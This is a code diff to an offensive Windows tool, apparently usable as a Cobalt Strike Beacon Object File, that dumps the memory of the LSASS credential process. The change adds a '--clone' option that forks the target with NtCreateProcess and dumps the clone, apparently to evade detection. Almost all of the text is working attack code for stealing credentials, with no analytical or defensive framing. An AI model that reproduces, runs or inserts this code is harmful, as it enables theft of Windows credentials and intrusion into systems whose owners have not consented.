@@ -338,7 +338,8 @@ BOOL enable_debug_priv(void)
 }
 
 HANDLE get_process_handle(
-    DWORD dwPid
+    DWORD dwPid,
+    int clone
 )
 {
     NTSTATUS status;
@@ -357,12 +358,20 @@ HANDLE get_process_handle(
     uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
     uPid.UniqueThread = (HANDLE)0;
 
+    DWORD dwFlags;
+
+    if (clone == 1)
+        dwFlags = PROCESS_CREATE_PROCESS;
+    else
+        dwFlags = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
+
     status = NtOpenProcess(
         &hProcess,
-        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+        dwFlags,
         &ObjectAttributes,
         &uPid
     );
+    
     if (status == STATUS_INVALID_CID)
     {
 #ifdef BOF
@@ -400,6 +409,39 @@ HANDLE get_process_handle(
         return NULL;
     }
 
+    if (clone == 1)
+    {
+        HANDLE hCloneProcess = NULL;
+        OBJECT_ATTRIBUTES CloneObjectAttributes;
+
+        InitializeObjectAttributes(
+            &CloneObjectAttributes,
+            NULL,
+            0x00000040,
+            NULL,
+            NULL
+        );
+
+        status = NtCreateProcess(&hCloneProcess, GENERIC_ALL, &CloneObjectAttributes, hProcess, TRUE, NULL, NULL, NULL);
+        
+        if (!NT_SUCCESS(status))
+        {
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "Failed to call NtCreateProcess, status: 0x%lx\n",
+                status
+            );
+            return NULL;
+        }
+        else
+        {
+            NtClose(hProcess); hProcess = NULL;
+            return hCloneProcess;
+        }
+    }
     return hProcess;
 }
 
@@ -1256,6 +1298,7 @@ void go(char* args, int length)
     int    pid;
     char*  dump_name;
     int    do_write;
+    int    clone;
     char*  signature;
     BOOL   success;
 
@@ -1264,6 +1307,7 @@ void go(char* args, int length)
     dump_name = BeaconDataExtract(&parser, NULL);
     do_write = BeaconDataInt(&parser);
     signature = BeaconDataExtract(&parser, NULL);
+    clone = BeaconDataInt(&parser);
 
 #ifndef _WIN64
     if(IsWoW64())
@@ -1286,6 +1330,15 @@ void go(char* args, int length)
         return;
     }
 
+    if (clone == 1 && pid == 0)
+    {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "Process cloning requires a PID. Exiting..."
+        );
+        return;
+    }
+
     success = enable_debug_priv();
     if (!success)
     {
@@ -1296,8 +1349,9 @@ void go(char* args, int length)
     }
 
     HANDLE hProcess;
+
     if (pid)
-        hProcess = get_process_handle(pid);
+        hProcess = get_process_handle(pid, clone);
     else
         hProcess = find_lsass();
     if (!hProcess)
@@ -1410,11 +1464,13 @@ void go(char* args, int length)
 
 void usage(char* procname)
 {
-    printf("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--pid 1234] [--help]\n", procname);
+    printf("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--clone] [--pid 1234] [--help]\n", procname);
     printf("    --write PATH, -w PATH\n");
     printf("            full path to the dumpfile\n");
     printf("    --valid, -v\n");
     printf("            create a dump with a valid signature (optional)\n");
+    printf("    --clone, -c\n");
+    printf("            clone target process before dumping (optional)\n");
     printf("    --pid PID, -p PID\n");
     printf("            the PID of LSASS (optional)\n");
     printf("    --help, -h\n");
@@ -1441,6 +1497,7 @@ void get_invalid_sig(char* signature)
 int main(int argc, char* argv[])
 {
     int pid = 0;
+    int clone = 0;
     char* dump_name = NULL;
     char signature[4];
     BOOL success;
@@ -1478,6 +1535,11 @@ int main(int argc, char* argv[])
         {
             pid = atoi(argv[++i]);
         }
+        else if (!strncmp(argv[i], "-c", 3) ||
+                 !strncmp(argv[i], "--clone", 8))
+        {
+            clone = 1;
+        }
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
         {
@@ -1503,6 +1565,12 @@ int main(int argc, char* argv[])
         return -1;
     }
 
+    if (clone == 1 && pid == 0)
+    {
+        printf("Process cloning requires a PID. Exiting...");
+        return -1;
+    }
+
     success = enable_debug_priv();
     if (!success)
     {
@@ -1513,7 +1581,7 @@ int main(int argc, char* argv[])
 
     HANDLE hProcess;
     if (pid)
-        hProcess = get_process_handle(pid);
+        hProcess = get_process_handle(pid, clone);
     else
         hProcess = find_lsass();
     if (!hProcess)
